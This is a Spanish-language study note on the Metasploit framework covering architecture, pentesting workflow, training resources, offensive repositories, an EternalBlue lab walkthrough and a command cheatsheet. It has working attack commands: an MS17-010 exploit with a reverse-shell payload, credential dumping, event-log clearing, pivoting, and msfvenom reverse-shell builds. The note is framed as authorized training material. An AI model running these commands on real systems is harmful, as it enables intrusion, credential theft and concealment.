---
date: 2025-04-14 18:02
title: Metasploit
keywords:
source:
status: 🌟
Parent: "[[Area-Sistemas]]"
category: ciberseguridad
tags:
  - metasploit
  - vulnerabilidades
  - pentesting
  - Hacking
---
# Metasploit

- [vulnerabilidades](/ciberseguridad/vulnerabilidades/)
- [Pentesting](/ciberseguridad/pentesting/)
- penetration testing
- Framework
- [Getting Started with Metasploit for Penetration Testing | Metasploit](https://www.metasploit.com/get-started)
- [Home | Metasploit Documentation Penetration Testing Software, Pen Testing Security](https://docs.metasploit.com/)

## Descripción general
Metasploit es un **framework de penetration testing** orientado a la **explotación de vulnerabilidades**, **post-explotación**, **movimiento lateral** y **validación de controles de seguridad**. Es ampliamente utilizado por pentesters, red teams y defensores para simular ataques reales y medir la exposición de sistemas.

Se compone principalmente de:
- Una base de datos extensa de exploits, payloads y módulos auxiliares
- Una consola interactiva (`msfconsole`)
- APIs y librerías para automatización
- Integración con herramientas externas (Nmap, [Nessus](/ciberseguridad/nessus/), etc.)

## Componentes principales del framework
### Exploits
Módulos que aprovechan una vulnerabilidad específica para obtener ejecución de código o acceso no autorizado.
	- Clasificados por sistema operativo, servicio o CVE
	- Pueden ser remotos o locales
	- Suelen requerir configuración de objetivos, puertos y payloads

### Payloads
Código que se ejecuta tras una explotación exitosa.
- Singles: ejecutan una acción concreta (ej. crear usuario)
- Stagers: cargan un payload más grande en varias fases
- Stages: payload completo (ej. Meterpreter)

### Encoders
Transforman payloads para evadir detecciones simples.
- Ofuscación básica
- Evitan firmas estáticas
- No garantizan evasión frente a EDR modernos

### Módulos auxiliares
No explotan directamente, pero apoyan el ataque.
- Escaneo
- Enumeración
- Fuerza bruta
- Recolección de información

### Post-explotación
Módulos utilizados tras obtener acceso.
- Escalada de privilegios
- Dumping de credenciales
- Persistencia
- Pivoting y movimiento lateral

## Meterpreter
Meterpreter es un payload avanzado y dinámico que se ejecuta en memoria.
- No escribe en disco por defecto
- Comunicación cifrada
- Extensible mediante scripts
- Permite control total del sistema comprometido

Funciones comunes:
- Captura de pantalla
- Keylogging
- Manipulación de procesos
- Túneles y pivoting

## Flujo típico de uso en pentesting
### Reconocimiento
Identificación de servicios y versiones.
- Importación de resultados de Nmap
- Enumeración de hosts y puertos
- Identificación de vectores explotables

### Explotación
Uso de módulos adecuados al entorno detectado.
- Selección de exploit
- Configuración de opciones
- Elección del payload
- Ejecución controlada

### Post-explotación
Expansión del acceso.
- Recolección de información sensible
- Escalada de privilegios
- Movimiento lateral
- Persistencia temporal (si el alcance lo permite)

### Reporte
Documentación de hallazgos.
- Vulnerabilidades explotadas
- Impacto real
- Evidencias
- Recomendaciones de mitigación

## Metasploit y gestión de vulnerabilidades
Metasploit se integra bien en procesos de [vulnerabilidades](/ciberseguridad/vulnerabilidades/) y validación de parches.
- Verifica si una vulnerabilidad es realmente explotable
- Reduce falsos positivos de escáneres automáticos
- Ayuda a priorizar riesgos según impacto real

## Integración con otras herramientas
- Nmap: importación directa de escaneos
- Nessus: correlación de vulnerabilidades
- Burp Suite: explotación de fallos web
- Bases de datos CVE y exploit-db

## Uso defensivo y blue team
Aunque es una herramienta ofensiva, también se usa defensivamente.
- Simulación de ataques controlados
- Validación de reglas de EDR/IDS/IPS
- Formación de equipos SOC
- Ejercicios de purple team

## Consideraciones legales y éticas
El uso de Metasploit debe estar siempre autorizado.
- Contratos de pentesting
- Laboratorios controlados
- Entornos de formación
El uso no autorizado puede constituir delito.

## Ejemplo básico de uso de msfconsole
### Inicialización y explotación simple
{% raw %}
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```
{% endraw %}`

## Automatización y scripting

Metasploit permite automatizar tareas repetitivas.
- Resource scripts (`.rc`)
- Integración con CI/CD de seguridad
- Uso de la API para red teaming avanzado

## Relación con [Pentesting](/ciberseguridad/pentesting/)

Metasploit es una de las herramientas centrales en metodologías de pentesting.
- Soporta fases técnicas completas
- Alineado con estándares como PTES y OSSTMM
- Facilita pruebas realistas de impacto

## Recursos oficiales

* [Getting Started with Metasploit for Penetration Testing | Metasploit](https://www.metasploit.com/get-started)
* [Home | Metasploit Documentation Penetration Testing Software, Pen Testing Security](https://docs.metasploit.com/)


# Metasploit — Conceptos Avanzados y Temas Complementarios

- [Pentesting](/ciberseguridad/pentesting/)
- [vulnerabilidades](/ciberseguridad/vulnerabilidades/)
- Framework
- penetration testing

## Arquitectura interna
Metasploit está construido de forma modular y extensible.
- Core: motor principal que gestiona módulos, sesiones y comunicaciones
- Framework Libraries: librerías Ruby reutilizables
- Interfaces: `msfconsole`, `msfvenom`, API RPC
- Base de datos: almacenamiento de hosts, servicios, credenciales y sesiones

Esta arquitectura permite:
- Desarrollo rápido de nuevos módulos
- Integración con herramientas externas
- Automatización avanzada de campañas

## Base de datos de Metasploit
El uso de base de datos mejora la trazabilidad.
- Almacena hosts, puertos y servicios
- Relaciona vulnerabilidades con exploits
- Guarda credenciales obtenidas
- Facilita reporting y correlación

Motores soportados:
- PostgreSQL (recomendado)
- SQLite (uso limitado)

## Tipos de sesiones
Metasploit gestiona diferentes tipos de sesiones tras la explotación.
- Shell sessions: acceso básico al sistema
- Meterpreter sessions: control avanzado en memoria
- Sessions persistentes: reutilizables tras reinicios (según técnica)

Cada sesión puede:
- Ejecutar módulos de post-explotación
- Ser migrada entre procesos
- Usarse como punto de pivoting

## Pivoting y movimiento lateral
Metasploit permite atacar redes internas desde un host comprometido.
- Ruteo dinámico (`route add`)
- SOCKS proxy para herramientas externas
- Escaneo de subredes internas
- Explotación de servicios no expuestos

Esto simula escenarios reales de intrusión avanzada.

## Gestión de credenciales
Metasploit centraliza credenciales obtenidas.
- Hashes de contraseñas
- Credenciales en texto claro
- Tokens y sesiones autenticadas

Usos:
- Reutilización de credenciales
- Pass-the-hash
- Autenticación contra nuevos servicios

## Desarrollo de módulos personalizados
Metasploit permite crear exploits y auxiliares propios.
- Lenguaje principal: Ruby
- Estructura estándar de módulos
- Uso de mixins reutilizables

Tipos comunes:
- Exploits
- Auxiliares
- Post
- Encoders
- Payloads

Esto es clave para:
- Vulnerabilidades 0-day
- Entornos personalizados
- Investigación ofensiva

## Evasión avanzada
Más allá de encoders básicos, se aplican técnicas adicionales.
- Ejecución en memoria
- Living-off-the-land
- Uso de payloads personalizados
- Técnicas de sleep y jitter

Limitaciones:
- EDR modernos detectan comportamientos
- Requiere adaptación constante

## Metasploit y Active Directory
Metasploit es especialmente potente en entornos AD.
- Enumeración de dominios
- Dumping de hashes
- Kerberoasting
- Movimiento lateral entre equipos

Se integra con técnicas clásicas de ataque a AD.

## Uso en Red Teaming
Metasploit es una herramienta base en ejercicios Red Team.
- Simulación de TTPs reales
- Cadena completa de ataque
- Coordinación con C2 externos
- Ejercicios purple team

Se complementa con frameworks como Cobalt Strike o Sliver.

## Limitaciones del framework
Metasploit no es una solución mágica.
- Muchos exploits son públicos y detectables
- Requiere ajuste manual
- No sustituye análisis manual
- Dependencia del contexto del entorno

Su valor está en la validación técnica, no en la automatización ciega.

## Metasploit en entornos cloud
Uso creciente en infraestructuras modernas.
- Ataque a servicios expuestos
- Validación de configuraciones erróneas
- Pruebas en entornos híbridos
- Uso combinado con herramientas cloud-native

## Integración en metodologías
Metasploit encaja en:
- PTES
- [MITRE ATT&CK](/ciberseguridad/mitre-att-ck/)(mapeo de técnicas)
- Ciclos de gestión de riesgos
- Programas de mejora continua de seguridad

## Comparativa conceptual con otras herramientas
Metasploit destaca por:
- Enfoque modular
- Comunidad amplia
- Curva de aprendizaje progresiva

Mientras que:
- Frameworks C2 se centran en persistencia
- Exploit kits priorizan automatización
- Herramientas manuales ofrecen mayor sigilo

## Uso educativo y laboratorios
Metasploit es clave en formación.
- Laboratorios controlados
- Certificaciones de pentesting
- Simulación de escenarios reales
- Aprendizaje de explotación paso a paso

## Relación con [Pentesting](/ciberseguridad/pentesting/) avanzado
En fases avanzadas:
- Valida impacto real
- Demuestra explotación encadenada
- Apoya toma de decisiones de negocio
- Eleva el nivel técnico del assessment

# Metasploit — Recursos Actualizados 2025

## Documentación y recursos oficiales
- **[Metasploit official site](https://www.metasploit.com/)** — Página principal del framework con **descargas, módulos recientes y blog con actualizaciones continuas**, incluyendo exploits y mejoras de payloads vigentes en 2025.
- **[Metasploit Documentation](https://docs.metasploit.com/)** — Documentación oficial completa para instalación, configuración, uso de módulos, APIs y mejores prácticas.

## Cursos y formación actualizada
### Formación online y guiada
- **[Curso de hacking ético con Metasploit (Udemy)](https://www.udemy.com/course/hacking-etico-metasploit/)** — Curso práctico con laboratorios reales, uso de Nmap, Nessus, MSFVenom y Meterpreter, actualizado en 2025.
- **[Metasploit Framework: Penetration Testing with Metasploit (Udemy)](https://www.udemy.com/course/metasploit-framework-penetration-testing-with-metasploit/)** — Formación progresiva de nivel básico a avanzado (inglés).
- **[Metasploit for Beginners: Ethical Penetration Testing (Coursera)](https://www.coursera.org/projects/metasploit-for-beginners-ethical-penetration-testing)** — Proyecto guiado paso a paso con enfoque práctico.
- **[SEC580: Metasploit for Enterprise Penetration Testing (SANS Institute)](https://www.sans.org/cyber-security-courses/metasploit-enterprise-penetration-testing/)** — Curso avanzado orientado a entornos empresariales y Red Team.
- **[Pen Testing with the Metasploit Framework (Pluralsight)](https://www.pluralsight.com/paths/penetration-testing-fundamentals-with-the-metasploit-framework)** — Ruta estructurada con laboratorios hands-on, vigente en 2025.

## Tutoriales gratuitos y guías prácticas
- **[Tutorial paso a paso para pruebas de red con Metasploit (LabEx)](https://labex.io/es/tutorials/nmap-how-to-use-metasploit-for-network-testing-420331)** — Guía práctica de escaneo, explotación y validación de vulnerabilidades.
- **[Guía básica de Metasploit para pruebas de penetración (Anixelo)](https://anixelo.com/guia-de-metasploit-para-pruebas-de-penetracion-basicas/)** — Introducción estructurada al uso del framework.
- **[Manual de consulta rápida Metasploit Framework (PDF 2025)](https://ciberseguridad.compuweb.cl/wp-content/uploads/2025/10/Manual-consulta-rapida-metasploit.pdf)** — Manual descargable con enfoque práctico y consideraciones legales.
- **[Metasploit EBook (Tutorialspoint)](https://www.tutorialspoint.com/ebook/metasploit-tutorial/index.asp)** — Ebook actualizado para dominar conceptos básicos y avanzados.

## Laboratorios y práctica hands-on
- **Metasploitable & Kali Labs** — Máquinas vulnerables diseñadas para practicar escaneo, explotación, post-explotación y escalada de privilegios.
- https://information.rapid7.com/metasploitable-download.html
- https://www.vulnhub.com/

## Integraciones y herramientas relacionadas
- **[vulnerabilidades](/ciberseguridad/vulnerabilidades/)** — Uso conjunto con escáneres y validación técnica de fallos explotables.
- **[Dradis Framework](https://dradisframework.com/)** — Plataforma colaborativa para consolidar evidencias y generar reportes profesionales integrables con Metasploit.

## Temas emergentes y tendencias 2025
- **IA aplicada al Pentesting con Metasploit** — Uso de APIs y automatización inteligente para priorización de exploits y encadenamiento de ataques.
- https://docs.metasploit.com/docs/using-metasploit/interfacing/metasploit-api.html
- **Automatización avanzada del pentesting** — Investigación y herramientas que combinan Metasploit con orquestadores, CI/CD de seguridad y frameworks autónomos.
- https://arxiv.org/abs/2502.16730

## Consejos de estudio
- Combinar **documentación oficial**, **formación estructurada** y **laboratorios prácticos**.
- Practicar exclusivamente en entornos autorizados como Metasploitable, VulnHub o CTFs.
- Aprender la integración de Metasploit con Nmap, Nessus, Burp Suite y frameworks de reporting.

## Recursos organizados por tipo
### Oficial y documentación
- https://www.metasploit.com/
- https://docs.metasploit.com/

### Formación estructurada
- Udemy (Metasploit 2025)
- Coursera Guided Project
- SANS SEC580
- Pluralsight Path

### Guías y tutoriales prácticos
- LabEx
- Anixelo
- Manual PDF 2025
- Tutorialspoint Ebook

### Laboratorios y práctica
- Metasploitable 2
- VulnHub
- CTF Labs

## Notas legales y éticas
- El uso de Metasploit debe realizarse únicamente en sistemas con **autorización explícita** o en entornos de laboratorio. El acceso no autorizado constituye delito.

# Metasploit — Repositorios Útiles y Open Source (Estado 2025)

- [Pentesting](/ciberseguridad/pentesting/)
- [vulnerabilidades](/ciberseguridad/vulnerabilidades/)
- Framework
- open source

## Repositorios oficiales de Metasploit
### Metasploit Framework
- **[rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)**  
	Repositorio principal del framework.
	- Exploits, payloads, módulos auxiliares y post-explotación
	- Desarrollo activo en 2025
	- Referencia base para entender la arquitectura interna

### Metasploit Documentation (source)
- **[rapid7/metasploit-docs](https://github.com/rapid7/metasploit-docs)**  
	Fuentes de la documentación oficial.
	- Ejemplos técnicos
	- Detalles de módulos
	- Uso de APIs y automatización

## Repositorios de módulos y exploits complementarios
### Módulos adicionales para Metasploit
- **[rapid7/metasploit-framework-modules](https://github.com/rapid7/metasploit-framework)**  
	Módulos comunitarios y contribuciones externas integradas progresivamente.

- **[trustedsec/metasploit-framework](https://github.com/trustedsec/metasploit-framework)**  
	Fork con módulos personalizados.
	- Enfoque Red Team
	- Técnicas ofensivas avanzadas

### Exploits y PoC reutilizables
- **[offensive-security/exploitdb](https://github.com/offensive-security/exploitdb)**  
	Base de datos pública de exploits.
	- PoC reutilizables
	- Conversión frecuente a módulos MSF
	- Referencia clave para investigación

- **[nixawk/metasploit_payloads](https://github.com/nixawk/metasploit_payloads)**  
	Colección de payloads personalizados.
	- Útil para evasión y pruebas específicas

## Desarrollo de payloads y evasión
### Payloads y shellcodes
- **[rapid7/metasploit-payloads](https://github.com/rapid7/metasploit-payloads)**  
	Repositorio dedicado a payloads.
	- Meterpreter
	- Shells multiplataforma
	- Desarrollo activo

- **[TheWover/donut](https://github.com/TheWover/donut)**  
	Shellcode generator.
	- Ejecución en memoria
	- Muy usado junto a Metasploit en 2025

### Evasión y ofuscación
- **[Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)**  
	Framework de evasión.
	- Generación de payloads ofuscados
	- Integrable con MSFVenom

- **[EgeBalci/sgn](https://github.com/EgeBalci/sgn)**  
	Shikata-ga-nai mejorado.
	- Ofuscación avanzada de shellcode

## Automatización y APIs
### Integración y orquestación
- **[rapid7/metasploit-automation](https://github.com/rapid7/metasploit-automation)**  
	Ejemplos de automatización.
	- Scripts
	- Uso de RPC y API

- **[danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)**  
	Listas de payloads, usuarios y contraseñas.
	- Muy usado en módulos auxiliares
	- Recurso transversal en pentesting

## Pivoting, C2 y movimiento lateral
### Complementos a Metasploit
- **[byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)**  
	Herramienta clave en entornos Windows y AD.
	- Complementa Metasploit en movimiento lateral

- **[BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)**  
	Framework C2 open source.
	- Integración conceptual con Metasploit
	- Post-explotación avanzada

- **[BishopFox/sliver](https://github.com/BishopFox/sliver)**  
	C2 moderno open source.
	- Usado en Red Team
	- Complemento frecuente a MSF

## Repositorios para Active Directory
### Ataques AD y post-explotación
- **[BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)**  
	Mapeo de relaciones en AD.
	- Integrable en fases post-explotación

- **[GhostPack/GhostPack](https://github.com/GhostPack/GhostPack)**  
	Colección de herramientas ofensivas AD.
	- Dumping de credenciales
	- Kerberos attacks

## Repositorios educativos y de laboratorio
### Práctica controlada
- **[rapid7/metasploitable3](https://github.com/rapid7/metasploitable3)**  
	Máquinas vulnerables oficiales.
	- Diseñadas para Metasploit
	- Windows y Linux

- **[vulnhub/vulnhub](https://github.com/vulnhub/vulnhub)**  
	Repositorio comunitario de máquinas vulnerables.

## Tendencias open source en 2025
- Mayor foco en:
	- Ejecución en memoria
	- Evasión de EDR
	- Automatización mediante APIs
	- Integración con C2 open source
- Metasploit sigue siendo núcleo, pero se usa junto a otras herramientas especializadas.

## Relación con [Pentesting](/ciberseguridad/pentesting/) avanzado
Estos repositorios permiten:
	- Extender capacidades de Metasploit
	- Adaptarse a entornos modernos
	- Crear cadenas de ataque realistas
	- Investigación ofensiva y defensiva

## Uso responsable
- Todos los repositorios deben usarse:
	- En laboratorios
	- En auditorías autorizadas
	- Con fines educativos o defensivos

# Metasploit — Guía Práctica con Caso Realista (Confs y Código)

## Escenario del caso práctico
Auditoría autorizada sobre una red interna de laboratorio.
	- Atacante: Kali Linux
	- Objetivo: Windows Server vulnerable (SMB)
	- Alcance: explotación, post-explotación básica y reporte técnico
	- Restricciones: sin persistencia permanente

## Preparación del entorno
### Requisitos
- Kali Linux actualizado
- Metasploit Framework
- Nmap
- Base de datos PostgreSQL activa
- Máquina objetivo vulnerable (ej. Metasploitable3 Windows)

## Configuración inicial de Metasploit
### Inicialización de base de datos
{% raw %}
```bash
msfdb init
msfconsole
db_status
```
{% endraw %}`

Resultado esperado:
- Base de datos conectada
- Capacidad de almacenar hosts, servicios y sesiones

## Reconocimiento y enumeración

### Escaneo con Nmap

{% raw %}
```bash
nmap -sS -sV -O -Pn 192.168.56.101 -oA scan_objetivo
```
{% endraw %}

Puertos relevantes detectados:
- 445/tcp SMB
- 135/tcp RPC

### Importación del escaneo a Metasploit

{% raw %}
```bash
db_import scan_objetivo.xml
hosts
services
```
{% endraw %}

## Identificación de vulnerabilidad

### Búsqueda de exploits relacionados

{% raw %}
```bash
search type:exploit platform:windows smb
```
{% endraw %}

Exploit seleccionado:
- MS17-010 (EternalBlue)
- Vulnerabilidad crítica en SMBv1

## Explotación del sistema

### Configuración del exploit

{% raw %}
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.101
set LHOST 192.168.56.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set EXITFUNC thread
```
{% endraw %}

Validación previa:

{% raw %}
```bash
check
```
{% endraw %}

### Ejecución del exploit

{% raw %}
```bash
exploit
```
{% endraw %}

Resultado esperado:
- Sesión Meterpreter activa
- Acceso remoto al sistema objetivo

## Gestión de la sesión

### Enumeración inicial

{% raw %}
```bash
sysinfo
getuid
ipconfig
```
{% endraw %}

Objetivo:
- Identificar sistema operativo
- Nivel de privilegios
- Interfaces de red internas

## Post-explotación básica

### Enumeración del sistema

{% raw %}
```bash
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
```
{% endraw %}

### Dumping de credenciales

{% raw %}
```bash
load kiwi
creds_all
```
{% endraw %}

Uso:
- Validar impacto real
- Demostrar exposición de credenciales

## Escalada de privilegios

### Sugerencia automática

{% raw %}
```bash
getsystem
```
{% endraw %}

### Enumeración de vectores locales

{% raw %}
```bash
run post/multi/recon/local_exploit_suggester
```
{% endraw %}

Selección manual según resultados:
- Exploits locales compatibles
- Ajuste a versión de Windows

## Movimiento lateral (opcional)

### Configuración de pivoting

{% raw %}
```bash
run autoroute -s 192.168.100.0/24
```
{% endraw %}

Verificación:

{% raw %}
```bash
route print
```
{% endraw %}

Uso:
- Acceso a subredes internas
- Simulación de compromiso en profundidad

## Limpieza controlada

### Eliminación de artefactos

{% raw %}
```bash
clearev
```
{% endraw %}

### Cierre de sesión

{% raw %}
```bash
exit
sessions -K
```
{% endraw %}

## Evidencias para reporte

### Información clave a documentar

- IP y hostname comprometidos
- Vulnerabilidad explotada (MS17-010)
- Acceso obtenido (SYSTEM)
- Credenciales expuestas
- Impacto técnico y de negocio

## Relación con [vulnerabilidades](/ciberseguridad/vulnerabilidades/)

Este caso demuestra:
- Explotación real frente a escaneo teórico
- Validación de riesgo crítico
- Necesidad de parches y segmentación de red

## Variantes del caso

### Alternativas de explotación

- Ataques web con Metasploit
- Explotación de servicios FTP/HTTP
- Payloads sin Meterpreter

### Dificultad avanzada

- Evasión de EDR
- Payloads en memoria personalizados
- Encadenamiento con C2 externos

# Metasploit — Cheatsheet de Comandos (Estado 2025)

## Gestión básica de msfconsole
{% raw %}
```bash
msfconsole
exit
version
banner
```
{% endraw %}`

## Ayuda y navegación

{% raw %}
```bash
help
?
help exploit
back
info
```
{% endraw %}

## Búsqueda de módulos

{% raw %}
```bash
search ms17-010
search type:exploit platform:windows
search name:smb type:auxiliary
search cve:2023
```
{% endraw %}

## Uso de módulos

{% raw %}
```bash
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/ssh/ssh_login
use post/windows/gather/hashdump
```
{% endraw %}

## Información y opciones del módulo

{% raw %}
```bash
show info
show options
show payloads
show targets
```
{% endraw %}

## Configuración de opciones

{% raw %}
```bash
set RHOSTS 192.168.1.10
set RPORT 445
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
setg LHOST 192.168.1.100
unset RHOSTS
```
{% endraw %}

## Ejecución de módulos

{% raw %}
```bash
run
exploit
exploit -j
```
{% endraw %}

## Gestión de jobs

{% raw %}
```bash
jobs
jobs -l
jobs -k 1
```
{% endraw %}

## Base de datos y workspace

{% raw %}
```bash
msfdb init
db_status
workspace
workspace -a cliente_A
workspace cliente_A
workspace -d cliente_A
```
{% endraw %}

## Hosts y servicios

{% raw %}
```bash
hosts
hosts -c address,os_name
services
services -p 445
```
{% endraw %}

## Importación de escaneos

{% raw %}
```bash
db_import scan.xml
db_import scan.nmap
db_import scan.gnmap
```
{% endraw %}

## Sesiones

{% raw %}
```bash
sessions
sessions -i 1
sessions -k 1
sessions -K
```
{% endraw %}

## Comandos Meterpreter básicos

{% raw %}
```bash
sysinfo
getuid
getsystem
ipconfig
ps
pwd
ls
cd
```
{% endraw %}

## Transferencia de archivos

{% raw %}
```bash
upload file.exe
download secret.txt
```
{% endraw %}

## Gestión de procesos

{% raw %}
```bash
ps
migrate 1234
kill 1234
```
{% endraw %}

## Credenciales y hashes

{% raw %}
```bash
hashdump
load kiwi
creds_all
creds
```
{% endraw %}

## Enumeración post-explotación

{% raw %}
```bash
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/checkvm
```
{% endraw %}

## Escalada de privilegios

{% raw %}
```bash
getsystem
run post/multi/recon/local_exploit_suggester
```
{% endraw %}

## Pivoting y rutas

{% raw %}
```bash
run autoroute -s 192.168.10.0/24
route print
route delete 192.168.10.0
```
{% endraw %}

## SOCKS proxy

{% raw %}
```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```
{% endraw %}

## Escaneo con módulos auxiliares

{% raw %}
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run
```
{% endraw %}

## Fuerza bruta

{% raw %}
```bash
use auxiliary/scanner/ssh/ssh_login
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
{% endraw %}

## Payloads y msfvenom

### Listar payloads

{% raw %}
```bash
msfvenom -l payloads
```
{% endraw %}

### Payload Windows

{% raw %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
```
{% endraw %}

### Payload Linux

{% raw %}
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```
{% endraw %}

## Listeners

{% raw %}
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```
{% endraw %}

## Limpieza y evasión básica

{% raw %}
```bash
clearev
background
```
{% endraw %}

## Automatización

### Resource scripts

{% raw %}
```bash
msfconsole -r script.rc
```
{% endraw %}

## Reporting

{% raw %}
```bash
loot
notes
creds
```
{% endraw %}

## Comandos útiles rápidos

{% raw %}
```bash
setg DisablePayloadHandler true
check
sessions -v
```
{% endraw %}

## Relación con [Pentesting](/ciberseguridad/pentesting/)

Este cheatsheet cubre:  
- Flujo completo de explotación  
- Operación diaria en auditorías  
- Uso eficiente en laboratorios y entornos controlados